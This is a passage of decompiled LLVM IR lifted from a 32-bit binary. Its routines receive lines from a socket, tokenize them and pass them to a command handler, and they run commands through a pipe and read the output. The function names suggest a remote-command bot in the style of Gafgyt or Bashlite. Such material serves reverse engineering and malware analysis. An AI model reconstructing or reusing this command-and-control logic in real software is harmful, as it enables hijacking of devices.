  %tmp280 = and i32 %v0_804d3b4, -4
  %v5_804d3bc = icmp eq i32 %tmp280, -16
  store i1 %v5_804d3bc, i1* %cf.global-to-local, align 1
  %v6_804d3bf = add i32 %v0_804d3b4, 8
  %v7_804d3bf = inttoptr i32 %v6_804d3bf to i32*
  store i32 %v5_804d311, i32* %v7_804d3bf, align 4
  %v0_804d3c2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d3c2 = add i32 %v0_804d3b4, 4
  %v3_804d3c2 = inttoptr i32 %v2_804d3c2 to i32*
  store i32 %v0_804d3c2, i32* %v3_804d3c2, align 4
  store i32 %v2_804d39b, i32* %eax.global-to-local, align 4
  %v3_804d3c9 = inttoptr i32 %v0_804d3b4 to i32*
  store i32 %v2_804d39b, i32* %v3_804d3c9, align 4
  %v7_804d3ca = call i32 @szprintf(i32 11, i32 ptrtoint ([11 x i8]* @global_var_8055ba7.175 to i32), i32 %v1_804d271, i32 %v1_804d271, i32 %v1_804d271, i32 %stack_var_-5832.1)
  %v0_804d3cf = load i32, i32* @esp, align 4
  %tmp281 = and i32 %v0_804d3cf, -8
  %v5_804d3d7 = icmp eq i32 %tmp281, -16
  store i1 %v5_804d3d7, i1* %cf.global-to-local, align 1
  %v2_804d3da = add i32 %v0_804d3cf, 4
  %v3_804d3da = inttoptr i32 %v2_804d3da to i32*
  store i32 ptrtoint (i32* @global_var_8055afd.166 to i32), i32* %v3_804d3da, align 4
  store i32 %v2_804d39b, i32* @eax, align 4
  %v3_804d3e1 = inttoptr i32 %v0_804d3cf to i32*
  store i32 %v2_804d39b, i32* %v3_804d3e1, align 4
  %v0_804d3e2 = call i32 @fdpopen()
  store i32 %v0_804d3e2, i32* %eax.global-to-local, align 4
  %v3_804d415 = inttoptr i32 %v0_804d3e2 to i8*
  br label %dec_label_pc_804d42a

dec_label_pc_804d3ef:                             ; preds = %dec_label_pc_804d42a
  store i32 %v2_804d39b, i32* %eax.global-to-local, align 4
  %v5_804d3f5 = icmp ult i32 %v1_804d441, 12
  store i1 %v5_804d3f5, i1* %cf.global-to-local, align 1
  %v3_804d3f8 = inttoptr i32 %v0_804d441 to i32*
  store i32 %v2_804d39b, i32* %v3_804d3f8, align 4
  %v0_804d3f9 = call i32 @trim()
  %v0_804d3fe = load i32, i32* @esp, align 4
  store i32 %v2_804d39b, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %tmp282 = and i32 %v0_804d3fe, -4
  %v5_804d40e = icmp eq i32 %tmp282, -16
  store i1 %v5_804d40e, i1* %cf.global-to-local, align 1
  %v2_804d411 = add i32 %v0_804d3fe, 8
  %v3_804d411 = inttoptr i32 %v2_804d411 to i32*
  store i32 1024, i32* %v3_804d411, align 4
  %v1_804d412 = add i32 %v0_804d3fe, 4
  %v2_804d412 = inttoptr i32 %v1_804d412 to i32*
  store i32 0, i32* %v2_804d412, align 4
  %v3_804d414 = inttoptr i32 %v0_804d3fe to i32*
  store i32 %v2_804d39b, i32* %v3_804d414, align 4
  %v2_804d415 = load i32, i32* %stack_var_-24, align 4
  %v4_804d415 = call i32 @__GI_memset(i8* %v3_804d415, i32 %stack_var_-28.1.ph, i32 %v2_804d415)
  store i32 %v4_804d415, i32* %eax.global-to-local, align 4
  %v0_804d41a = load i32, i32* @esp, align 4
  %v1_804d41a = add i32 %v0_804d41a, 16
  %v5_804d41d = icmp ult i32 %v1_804d41a, 12
  store i1 %v5_804d41d, i1* %cf.global-to-local, align 1
  %v2_804d420 = inttoptr i32 %v0_804d41a to i32*
  store i32 1, i32* %v2_804d420, align 4
  %v0_804d422 = call i32 @sleep()
  store i32 %v0_804d422, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d42a

dec_label_pc_804d42a:                             ; preds = %dec_label_pc_804d39b, %dec_label_pc_804d3ef
  %storemerge23.in.in = load i32, i32* @esp, align 4
  %tmp283 = and i32 %storemerge23.in.in, -4
  %v5_804d42a = icmp eq i32 %tmp283, -16
  store i1 %v5_804d42a, i1* %cf.global-to-local, align 1
  %v5_804d42d = add i32 %storemerge23.in.in, 8
  %v6_804d42d = inttoptr i32 %v5_804d42d to i32*
  store i32 %v0_804d3e2, i32* %v6_804d42d, align 4
  %v1_804d430 = add i32 %storemerge23.in.in, 4
  %v2_804d430 = inttoptr i32 %v1_804d430 to i32*
  store i32 1024, i32* %v2_804d430, align 4
  store i32 %v2_804d39b, i32* %eax.global-to-local, align 4
  %v3_804d43b = inttoptr i32 %storemerge23.in.in to i32*
  store i32 %v2_804d39b, i32* %v3_804d43b, align 4
  %v2_804d43c = load i32, i32* %stack_var_-24, align 4
  %v3_804d43c = call i32 @fdgets(i32 %v0_804d3e2, i32 %stack_var_-28.1.ph, i32 %v2_804d43c)
  store i32 %v3_804d43c, i32* %eax.global-to-local, align 4
  %v0_804d441 = load i32, i32* @esp, align 4
  %v1_804d441 = add i32 %v0_804d441, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d444 = icmp eq i32 %v3_804d43c, 0
  %v1_804d446 = icmp eq i1 %v1_804d444, false
  br i1 %v1_804d446, label %dec_label_pc_804d3ef, label %dec_label_pc_804d448

dec_label_pc_804d448:                             ; preds = %dec_label_pc_804d42a
  %v5_804d448 = icmp ult i32 %v1_804d441, 12
  store i1 %v5_804d448, i1* %cf.global-to-local, align 1
  %v6_804d44b = inttoptr i32 %v0_804d441 to i32*
  store i32 %v0_804d3e2, i32* %v6_804d44b, align 4
  %v0_804d44e = call i32 @fdpclose()
  store i32 %v0_804d44e, i32* @eax, align 4
  %v0_804d453 = load i32, i32* @esp, align 4
  %v1_804d453 = add i32 %v0_804d453, 16
  %v5_804d456 = icmp ult i32 %v1_804d453, 12
  store i1 %v5_804d456, i1* %cf.global-to-local, align 1
  %v2_804d459 = inttoptr i32 %v0_804d453 to i32*
  store i32 0, i32* %v2_804d459, align 4
  %v1_804d45b = call i32 @__GI_exit(i32 %v0_804d3e2)
  store i32 %v1_804d45b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d460

dec_label_pc_804d460:                             ; preds = %dec_label_pc_804d345, %dec_label_pc_804d448
  store i32 %v5_804d311, i32* @eax, align 4
  %v0_804d46a = load i32, i32* @esp, align 4
  %v5_804d46a = icmp ult i32 %v0_804d46a, 8
  store i1 %v5_804d46a, i1* %cf.global-to-local, align 1
  %v1_804d46d = add i32 %v0_804d46a, -12
  %v2_804d46d = inttoptr i32 %v1_804d46d to i32*
  store i32 ptrtoint (i32* @global_var_8055bba.177 to i32), i32* %v2_804d46d, align 4
  %v0_804d472 = load i32, i32* @eax, align 4
  %v2_804d472 = add i32 %v0_804d46a, -16
  %v3_804d472 = inttoptr i32 %v2_804d472 to i32*
  store i32 %v0_804d472, i32* %v3_804d472, align 4
  %v1_804d473 = load i8*, i8** %stack_var_-36, align 4
  %v2_804d473 = ptrtoint i8* %v1_804d473 to i32
  %v3_804d473 = call i32 @__GI_strtok(i32 1, i32 %v2_804d473)
  %v0_804d478 = load i32, i32* @esp, align 4
  %v1_804d478 = add i32 %v0_804d478, 16
  %v5_804d47b = inttoptr i32 %v3_804d473 to i8*
  store i8* %v5_804d47b, i8** %stack_var_-36, align 4
  store i32 %v1_804d271, i32* %eax.global-to-local, align 4
  store i32 %v1_804d271, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d53465 = icmp eq i32 %v3_804d473, 0
  %v1_804d53872 = icmp eq i1 %v5_804d53465, false
  br i1 %v1_804d53872, label %dec_label_pc_804d48c, label %dec_label_pc_804d53e

dec_label_pc_804d48c:                             ; preds = %dec_label_pc_804d460, %dec_label_pc_804d51f
  %v0_804d51f98 = phi i32 [ %v1_804d52e, %dec_label_pc_804d51f ], [ %v1_804d478, %dec_label_pc_804d460 ]
  %v3_804d49c = phi i8* [ %tmp193, %dec_label_pc_804d51f ], [ %v5_804d47b, %dec_label_pc_804d460 ]
  %stack_var_-40.173 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804d51f ], [ 1, %dec_label_pc_804d460 ]
  %v4_804d48c = ptrtoint i8* %v3_804d49c to i32
  store i32 %v4_804d48c, i32* %eax.global-to-local, align 4
  %v2_804d48f = load i8, i8* %v3_804d49c, align 1
  %v3_804d48f = zext i8 %v2_804d48f to i32
  %v5_804d48f = and i32 %v4_804d48c, -256
  %v6_804d48f = or i32 %v3_804d48f, %v5_804d48f
  store i32 %v6_804d48f, i32* @eax, align 4
  %v6_804d491 = icmp ult i8 %v2_804d48f, 10
  store i1 %v6_804d491, i1* %cf.global-to-local, align 1
  %v10_804d491 = icmp eq i8 %v2_804d48f, 10
  br i1 %v10_804d491, label %dec_label_pc_804d51f, label %dec_label_pc_804d499

dec_label_pc_804d499:                             ; preds = %dec_label_pc_804d48c
  store i32 %stack_var_-40.173, i32* @ebx, align 4
  store i32 %v5_804d48f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d48c, i32* @edi, align 4
  %v3_804d4b3 = call i32 @_strlen(i8* %v3_804d49c)
  %v1_804d4b7 = add i32 %v3_804d4b3, 1
  store i32 %v1_804d4b7, i32* %eax.global-to-local, align 4
  %v0_804d4bb = load i32, i32* @esp, align 4
  %v5_804d4bb = icmp ult i32 %v0_804d4bb, 12
  store i1 %v5_804d4bb, i1* %cf.global-to-local, align 1
  %v2_804d4be = add i32 %v0_804d4bb, -16
  %v3_804d4be = inttoptr i32 %v2_804d4be to i32*
  store i32 %v1_804d4b7, i32* %v3_804d4be, align 4
  %v2_804d4bf = call i32 @malloc(i32 %v4_804d48c)
  %v0_804d4c4 = load i32, i32* @esp, align 4
  %v2_804d4c4 = icmp ugt i32 %v0_804d4c4, -17
  store i1 %v2_804d4c4, i1* %cf.global-to-local, align 1
  %v1_804d4c7 = load i32, i32* @ebp, align 4
  %v2_804d4c7 = load i32, i32* @ebx, align 4
  %v3_804d4c7 = mul i32 %v2_804d4c7, 4
  %v4_804d4c7 = add i32 %v1_804d4c7, -616
  %v5_804d4c7 = add i32 %v4_804d4c7, %v3_804d4c7
  %v6_804d4c7 = inttoptr i32 %v5_804d4c7 to i32*
  store i32 %v2_804d4bf, i32* %v6_804d4c7, align 4
  %v3_804d4ce = load i8*, i8** %stack_var_-36, align 4
  %v4_804d4ce = ptrtoint i8* %v3_804d4ce to i32
  %v1_804d4dc = and i32 %v4_804d4ce, -256
  store i32 %v1_804d4dc, i32* %eax.global-to-local, align 4
  %v3_804d4e5 = call i32 @_strlen(i8* %v3_804d4ce)
  %v1_804d4e9 = add i32 %v3_804d4e5, 1
  store i32 %v1_804d4e9, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.173, i32* %eax.global-to-local, align 4
  %v0_804d4f2 = load i32, i32* @ebp, align 4
  %v2_804d4f2 = mul i32 %stack_var_-40.173, 4
  %v3_804d4f2 = add i32 %v2_804d4f2, -616
  %v4_804d4f2 = add i32 %v0_804d4f2, %v3_804d4f2
  %v5_804d4f2 = inttoptr i32 %v4_804d4f2 to i32*
  %v6_804d4f2 = load i32, i32* %v5_804d4f2, align 4
  %v1_804d4f9 = inttoptr i32 %v6_804d4f2 to i8*
  store i32 %v6_804d4f2, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804d4fe = and i32 %v6_804d4f2, -256
  store i32 %v1_804d4fe, i32* %eax.global-to-local, align 4
  %v5_804d500 = call i8* @_memset(i8* %v1_804d4f9, i32 %v1_804d4fe, i32 %v1_804d4e9)
  %v6_804d500 = ptrtoint i8* %v5_804d500 to i32
  store i32 %v6_804d500, i32* @ecx, align 4
  store i32 %v4_804d4ce, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.173, i32* %eax.global-to-local, align 4
  %v0_804d508 = load i32, i32* @ebp, align 4
  %v4_804d508 = add i32 %v0_804d508, %v3_804d4f2
  %v5_804d508 = inttoptr i32 %v4_804d508 to i32*
  %v6_804d508 = load i32, i32* %v5_804d508, align 4
  store i32 %v6_804d508, i32* @eax, align 4
  %v0_804d50f = load i32, i32* @esp, align 4
  %v5_804d50f = icmp ult i32 %v0_804d50f, 8
  store i1 %v5_804d50f, i1* %cf.global-to-local, align 1
  %v2_804d512 = add i32 %v0_804d50f, -12
  %v3_804d512 = inttoptr i32 %v2_804d512 to i32*
  store i32 %v4_804d4ce, i32* %v3_804d512, align 4
  %v0_804d513 = load i32, i32* @eax, align 4
  %v2_804d513 = add i32 %v0_804d50f, -16
  %v3_804d513 = inttoptr i32 %v2_804d513 to i32*
  store i32 %v0_804d513, i32* %v3_804d513, align 4
  %v5_804d514 = call i32 @strcpy(i8* %v3_804d4ce, i32 %v4_804d48c)
  store i32 %v5_804d514, i32* @eax, align 4
  %v0_804d519 = load i32, i32* @esp, align 4
  %v1_804d519 = add i32 %v0_804d519, 16
  %v2_804d519 = icmp ugt i32 %v0_804d519, -17
  store i1 %v2_804d519, i1* %cf.global-to-local, align 1
  %v4_804d51c = add i32 %stack_var_-40.173, 1
  br label %dec_label_pc_804d51f

dec_label_pc_804d51f:                             ; preds = %dec_label_pc_804d48c, %dec_label_pc_804d499
  %v0_804d51f = phi i32 [ %v0_804d51f98, %dec_label_pc_804d48c ], [ %v1_804d519, %dec_label_pc_804d499 ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.173, %dec_label_pc_804d48c ], [ %v4_804d51c, %dec_label_pc_804d499 ]
  %v5_804d51f = icmp ult i32 %v0_804d51f, 8
  store i1 %v5_804d51f, i1* %cf.global-to-local, align 1
  %v1_804d522 = add i32 %v0_804d51f, -12
  %v2_804d522 = inttoptr i32 %v1_804d522 to i32*
  store i32 ptrtoint (i32* @global_var_8055bba.177 to i32), i32* %v2_804d522, align 4
  %v1_804d527 = add i32 %v0_804d51f, -16
  %v2_804d527 = inttoptr i32 %v1_804d527 to i32*
  store i32 0, i32* %v2_804d527, align 4
  %v1_804d529 = load i8*, i8** %stack_var_-36, align 4
  %v2_804d529 = ptrtoint i8* %v1_804d529 to i32
  %v3_804d529 = call i32 @__GI_strtok(i32 %stack_var_-40.0, i32 %v2_804d529)
  store i32 %v3_804d529, i32* %eax.global-to-local, align 4
  %v0_804d52e = load i32, i32* @esp, align 4
  %v1_804d52e = add i32 %v0_804d52e, 16
  store i32 %v3_804d529, i32* %tmp191, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d534 = icmp eq i32 %v3_804d529, 0
  %v1_804d538 = icmp eq i1 %v5_804d534, false
  %tmp193 = inttoptr i32 %v3_804d529 to i8*
  br i1 %v1_804d538, label %dec_label_pc_804d48c, label %dec_label_pc_804d53e

dec_label_pc_804d53e:                             ; preds = %dec_label_pc_804d51f, %dec_label_pc_804d460
  %v0_804d53e = phi i32 [ %v1_804d478, %dec_label_pc_804d460 ], [ %v1_804d52e, %dec_label_pc_804d51f ]
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804d460 ], [ %stack_var_-40.0, %dec_label_pc_804d51f ]
  %v5_804d53e = icmp ult i32 %v0_804d53e, 8
  store i1 %v5_804d53e, i1* %cf.global-to-local, align 1
  store i32 %v2_804d541, i32* %eax.global-to-local, align 4
  %v2_804d547 = add i32 %v0_804d53e, -12
  %v3_804d547 = inttoptr i32 %v2_804d547 to i32*
  store i32 %v2_804d541, i32* %v3_804d547, align 4
  %v5_804d548 = add i32 %v0_804d53e, -16
  %v6_804d548 = inttoptr i32 %v5_804d548 to i32*
  store i32 %stack_var_-40.1.lcssa, i32* %v6_804d548, align 4
  %v0_804d54b = call i32 @processCmd()
  store i32 %v0_804d54b, i32* %eax.global-to-local, align 4
  %v0_804d550 = load i32, i32* @esp, align 4
  %v9_804d553 = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804d553, i1* %cf.global-to-local, align 1
  %v7_804d557 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804d557, label %dec_label_pc_804d569.lr.ph, label %dec_label_pc_804d58a.outer26

dec_label_pc_804d569.lr.ph:                       ; preds = %dec_label_pc_804d53e
  store i32 1, i32* %eax.global-to-local, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d569

dec_label_pc_804d569:                             ; preds = %dec_label_pc_804d569.lr.ph, %dec_label_pc_804d569
  %storemerge252 = phi i32 [ 1, %dec_label_pc_804d569.lr.ph ], [ %v4_804d57f, %dec_label_pc_804d569 ]
  %v0_804d573251.in = phi i32 [ %v0_804d550, %dec_label_pc_804d569.lr.ph ], [ %v0_804d57c, %dec_label_pc_804d569 ]
  %v0_804d573251 = add i32 %v0_804d573251.in, 16
  store i32 %storemerge252, i32* %eax.global-to-local, align 4
  %v0_804d56c = load i32, i32* @ebp, align 4
  %v2_804d56c = mul i32 %storemerge252, 4
  %v3_804d56c = add i32 %v2_804d56c, -616
  %v4_804d56c = add i32 %v3_804d56c, %v0_804d56c
  %v5_804d56c = inttoptr i32 %v4_804d56c to i32*
  %v6_804d56c = load i32, i32* %v5_804d56c, align 4
  store i32 %v6_804d56c, i32* %eax.global-to-local, align 4
  %v5_804d573 = icmp ult i32 %v0_804d573251, 12
  store i1 %v5_804d573, i1* %cf.global-to-local, align 1
  %v3_804d576 = inttoptr i32 %v0_804d573251.in to i32*
  store i32 %v6_804d56c, i32* %v3_804d576, align 4
  %v1_804d577 = call i32 @free(i32 %storemerge252)
  %v0_804d57c = load i32, i32* @esp, align 4
  %v4_804d57f = add nuw nsw i32 %storemerge252, 1
  store i32 %v4_804d57f, i32* %eax.global-to-local, align 4
  %v10_804d585 = icmp ult i32 %v4_804d57f, %stack_var_-40.1.lcssa
  store i1 %v10_804d585, i1* %cf.global-to-local, align 1
  %v5_804d588 = icmp slt i32 %v4_804d57f, %stack_var_-40.1.lcssa
  br i1 %v5_804d588, label %dec_label_pc_804d569, label %dec_label_pc_804d58a.outer

dec_label_pc_804d58a.outer:                       ; preds = %dec_label_pc_804d569, %dec_label_pc_804cf1f
  %stack_var_-28.1.ph = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_804cf1f ], [ %v4_804d57f, %dec_label_pc_804d569 ]
  %stack_var_-5832.2.ph = phi i32 [ %stack_var_-5832.0.ph, %dec_label_pc_804cf1f ], [ %stack_var_-5832.1, %dec_label_pc_804d569 ]
  %stack_var_-64.2.ph = phi i8* [ %stack_var_-64.0.ph, %dec_label_pc_804cf1f ], [ %v22_804d311, %dec_label_pc_804d569 ]
  %stack_var_-60.3.ph = phi i32 [ %stack_var_-60.0.ph36, %dec_label_pc_804cf1f ], [ %stack_var_-60.2, %dec_label_pc_804d569 ]
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph37, %dec_label_pc_804cf1f ], [ %stack_var_-96.1, %dec_label_pc_804d569 ]
  br label %dec_label_pc_804d58a.outer26

dec_label_pc_804d58a.outer26:                     ; preds = %dec_label_pc_804d38e, %dec_label_pc_804d53e, %dec_label_pc_804d58a.outer
  %stack_var_-5832.2.ph27 = phi i32 [ %stack_var_-5832.2.ph, %dec_label_pc_804d58a.outer ], [ %stack_var_-5832.1, %dec_label_pc_804d53e ], [ %stack_var_-5832.1, %dec_label_pc_804d38e ]
  %stack_var_-64.2.ph28 = phi i8* [ %stack_var_-64.2.ph, %dec_label_pc_804d58a.outer ], [ %v22_804d311, %dec_label_pc_804d53e ], [ %v22_804d311, %dec_label_pc_804d38e ]
  %stack_var_-60.3.ph29 = phi i32 [ %stack_var_-60.3.ph, %dec_label_pc_804d58a.outer ], [ %stack_var_-60.2, %dec_label_pc_804d53e ], [ %stack_var_-60.2, %dec_label_pc_804d38e ]
  %stack_var_-96.2.ph30 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_804d58a.outer ], [ %stack_var_-96.1, %dec_label_pc_804d53e ], [ %stack_var_-96.1, %dec_label_pc_804d38e ]
  br label %dec_label_pc_804d58a.outer31

dec_label_pc_804d58a.outer31:                     ; preds = %dec_label_pc_804d236, %dec_label_pc_804d202, %dec_label_pc_804d58a.outer26
  %stack_var_-64.2.ph32 = phi i8* [ %stack_var_-64.2.ph28, %dec_label_pc_804d58a.outer26 ], [ %tmp190, %dec_label_pc_804d202 ], [ %tmp190, %dec_label_pc_804d236 ]
  %stack_var_-60.3.ph33 = phi i32 [ %stack_var_-60.3.ph29, %dec_label_pc_804d58a.outer26 ], [ %stack_var_-60.2, %dec_label_pc_804d202 ], [ %stack_var_-60.2, %dec_label_pc_804d236 ]
  %stack_var_-96.2.ph34 = phi i32 [ %stack_var_-96.2.ph30, %dec_label_pc_804d58a.outer26 ], [ %stack_var_-96.1, %dec_label_pc_804d202 ], [ %stack_var_-96.1, %dec_label_pc_804d236 ]
  %v2_804cf86 = ptrtoint i8* %stack_var_-64.2.ph32 to i32
  %v0_804d596.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d58a

dec_label_pc_804d58a:                             ; preds = %dec_label_pc_804d58a.outer31, %dec_label_pc_804d173
  %v0_804d596 = phi i32 [ %v1_804d1a4, %dec_label_pc_804d173 ], [ %v0_804d596.pre, %dec_label_pc_804d58a.outer31 ]
  %stack_var_-60.3 = phi i32 [ %stack_var_-60.2, %dec_label_pc_804d173 ], [ %stack_var_-60.3.ph33, %dec_label_pc_804d58a.outer31 ]
  store i32 %v2_804d58a, i32* %eax.global-to-local, align 4
  %v0_804d590 = load i32, i32* @global_var_80584c0.18, align 64
  store i32 %v0_804d590, i32* %edx.global-to-local, align 4
  %v5_804d596 = icmp ult i32 %v0_804d596, 4
  store i1 %v5_804d596, i1* %cf.global-to-local, align 1
  %v1_804d599 = add i32 %v0_804d596, -8
  %v2_804d599 = inttoptr i32 %v1_804d599 to i32*
  store i32 4096, i32* %v2_804d599, align 4
  %v2_804d59e = add i32 %v0_804d596, -12
  %v3_804d59e = inttoptr i32 %v2_804d59e to i32*
  store i32 %v2_804d58a, i32* %v3_804d59e, align 4
  %v0_804d59f = load i32, i32* %edx.global-to-local, align 4
  %v2_804d59f = add i32 %v0_804d596, -16
  %v3_804d59f = inttoptr i32 %v2_804d59f to i32*
  store i32 %v0_804d59f, i32* %v3_804d59f, align 4
  %v0_804d5a0 = call i32 @recvLine()
  store i32 %v0_804d5a0, i32* %eax.global-to-local, align 4
  %v0_804d5a5 = load i32, i32* @esp, align 4
  %v8_804d5ab = icmp ne i32 %v0_804d5a0, -1
  store i1 %v8_804d5ab, i1* %cf.global-to-local, align 1
  %v13_804d5ab = icmp eq i32 %v0_804d5a0, -1
  %v1_804d5af = icmp eq i1 %v13_804d5ab, false
  br i1 %v1_804d5af, label %dec_label_pc_804d115, label %dec_label_pc_804cf07.outer

; uselistorder directives
  uselistorder i32 %v0_804d5a0, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-60.3, { 1, 0 }
  uselistorder i32 %v0_804d596, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-96.2.ph34, { 0, 2, 1 }
  uselistorder i8* %stack_var_-64.2.ph32, { 2, 1, 0 }
  uselistorder i32 %stack_var_-5832.2.ph27, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.1.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v4_804d57f, { 0, 3, 1, 2, 4 }
  uselistorder i32 %storemerge252, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804d53e, { 2, 1, 0 }
  uselistorder i32 %v3_804d529, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 0, 2, 1 }
  uselistorder i32 %v0_804d51f, { 2, 1, 0 }
  uselistorder i32 %v1_804d4e9, { 1, 0 }
  uselistorder i32 %v1_804d4b7, { 1, 0 }
  uselistorder i32 %v5_804d48f, { 1, 0 }
  uselistorder i32 %v4_804d48c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-40.173, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_804d49c, { 2, 0, 1 }
  uselistorder i32 %v1_804d478, { 1, 0 }
  uselistorder i32 %v0_804d441, { 0, 2, 1 }
  uselistorder i32 %storemerge23.in.in, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804d3fe, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804d3e2, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_804d3cf, { 1, 2, 0 }
  uselistorder i32 %v0_804d3b4, { 1, 2, 3, 0 }
  uselistorder i1 %v0_804d377, { 1, 0 }
  uselistorder i32 %v7_804d375, { 1, 0 }
  uselistorder i8* %v22_804d311, { 1, 2, 0 }
  uselistorder i8* %storemerge15, { 1, 0 }
  uselistorder i32 %v5_804d339, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804d32a, { 1, 0 }
  uselistorder i32 %storemerge15.in246, { 2, 1, 0 }
  uselistorder i8* %storemerge15247, { 1, 0 }
  uselistorder i32 %v6_804d2e4, { 1, 0 }
  uselistorder i32 %v6_804d2bc, { 1, 0 }
  uselistorder i32 %stack_var_-5832.1, { 1, 2, 0, 3 }
  uselistorder i32 %v6_804d297, { 1, 0 }
  uselistorder i32 %v1_804d2ac, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_804d274, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804d271, { 10, 9, 16, 14, 7, 8, 12, 11, 0, 4, 1, 2, 3, 13, 15, 6, 5, 17, 18, 19 }
  uselistorder i32 %v6_804d26e, { 1, 0 }
  uselistorder i32 %v5_804d221, { 0, 1, 4, 3, 2 }
  uselistorder i32 %stack_var_-96.1, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v4_804d1da, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %v3_804d1c6, { 0, 2, 1 }
  uselistorder i32 %v1_804d1a4, { 1, 0 }
  uselistorder i32 %v0_804d1a4, { 1, 0, 2 }
  uselistorder i32 %v3_804d19f, { 0, 2, 1 }
  uselistorder i32 %v0_804d18d, { 1, 2, 0 }
  uselistorder i32 %v0_804d12f, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v0_804d129, { 1, 0, 2 }
  uselistorder i32 %storemerge17, { 2, 5, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.2, { 6, 3, 4, 1, 2, 0, 5, 8, 7 }
  uselistorder i32 %v0_804cf7e.in, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804d0b7, { 1, 0, 2 }
  uselistorder i32 %storemerge18, { 1, 3, 0, 2 }
  uselistorder i32 %v2_804d084, { 2, 0, 1 }
  uselistorder i32 %v1_804d06d, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d038, { 1, 0 }
  uselistorder i32 %v0_804cfdd, { 1, 0, 2 }
  uselistorder i32 %storemerge19, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v2_804cfac, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804cf6f, { 1, 0 }
  uselistorder i8* %storemerge16210, { 2, 0, 1, 3 }
  uselistorder i32 %v5_804d20e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_804d39b, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %v2_804d58a, { 15, 16, 0, 1, 6, 5, 7, 8, 2, 10, 9, 11, 12, 13, 14, 3, 4 }
  uselistorder i32 %v2_804ce6d, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804ce14, { 2, 1, 0, 3, 4 }
  uselistorder i8* %tmp186, { 1, 0, 2 }
  uselistorder i32 %v2_804cd98, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v7_804cd45, { 1, 0 }
  uselistorder i32 %v3_804ce1113, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 7, 6, 3, 1, 0, 2, 5, 4, 8 }
  uselistorder i32* %tmp182, { 1, 0, 2 }
  uselistorder i1 %v5_804cc88, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v2_804cc4d, { 1, 0, 2 }
  uselistorder i1 %v5_804cc39, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_804cba9, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-24, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-5872, { 3, 0, 1, 2 }
  uselistorder i8** %stack_var_-5888, { 22, 25, 21, 20, 19, 16, 15, 18, 17, 24, 23, 14, 12, 11, 13, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-624, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-1648, { 1, 0, 2 }
  uselistorder i8** %stack_var_-36, { 3, 2, 1, 4, 0 }
  uselistorder i32* %edx.global-to-local, { 13, 14, 0, 1, 2, 3, 4, 5, 12, 7, 6, 8, 10, 9, 11, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %eax.global-to-local, { 78, 79, 2, 0, 1, 130, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 15, 16, 17, 18, 21, 22, 23, 24, 25, 34, 26, 27, 30, 31, 28, 29, 128, 129, 32, 33, 35, 36, 131, 126, 37, 38, 39, 42, 43, 44, 40, 41, 45, 46, 47, 48, 49, 50, 51, 52, 127, 125, 53, 54, 55, 56, 57, 58, 59, 60, 61, 77, 62, 63, 66, 64, 65, 67, 68, 71, 69, 70, 72, 73, 74, 75, 76, 80, 81, 82, 84, 83, 132, 85, 86, 87, 88, 89, 92, 90, 91, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124 }
